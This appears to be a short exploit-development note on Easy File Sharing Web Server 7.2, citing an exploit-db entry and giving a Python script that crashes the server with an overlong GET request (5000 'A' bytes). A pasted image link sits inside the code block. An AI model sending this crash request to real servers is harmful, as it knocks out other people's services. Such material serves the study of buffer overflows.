# Easy File Sharing Web Server 7.2

Downloaded from: https://www.exploit-db.com/exploits/39008

## Initial Crash

```py
import socket
import os
import sys

ip = "127.0.0.1"
port = 80

crash = b"A" * 5000


buffer=b"GET "
buffer+=crash
buffer+=b" HTTP/1.1\r\n"

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()![immagine](https://user-images.githubusercontent.com/59916156/194383309-2de56b0f-4df2-456f-8d88-99e4fcc84288.png)
```
